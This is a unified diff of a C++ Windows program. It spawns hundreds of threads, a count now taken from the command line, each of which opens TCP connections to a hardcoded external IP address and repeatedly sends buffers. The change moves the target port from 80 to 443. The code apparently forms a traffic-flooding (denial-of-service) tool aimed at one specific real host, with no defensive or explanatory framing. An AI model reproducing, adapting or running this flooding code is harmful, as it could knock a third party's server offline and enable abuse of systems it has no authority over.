@@ -5,12 +5,12 @@
 #include <fstream>
 #pragma comment(dll,"ws2_32.dll")
 using namespace std;
-#define int long long
-static const int numthread = 400;
+//#define int long long
+int numthread = 400;
 
 void show(int i) {
 	fstream f;
-	string s = "C:\\Users\\Admin\\cc\\" + to_string(i) + ".txt";
+	string s = to_string(i) + ".txt";
 	f.open(s, ios::out);
 	int min = 0, max = 1e9;
 	random_device seed;
@@ -36,7 +36,7 @@ void tcp(int i) {
 
 	SOCKADDR_IN addrSrv;
 	addrSrv.sin_family = AF_INET;
-	addrSrv.sin_port = htons(80);
+	addrSrv.sin_port = htons(443);
 	addrSrv.sin_addr.S_un.S_addr = inet_addr("124.205.120.153");
 
 	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
@@ -63,10 +63,10 @@ void tcp(int i) {
 		send(sockClient, buffs, sizeof(buffs), 0);
 	}
 }
-signed main() {
-	//freopen("XXX.in","r",stdin);
-	//freopen("XXX.out","w",stdout);
-	system("md C:\\Users\\Admin\\cc\\");
+signed main(int argc, char *argv[]){
+	if(argc!=2)cout<<"error thread number";
+	numthread=atoi(argv[1]);
+	
 	thread mythread[numthread], ctcp[numthread];
 	Sleep(1000);
 
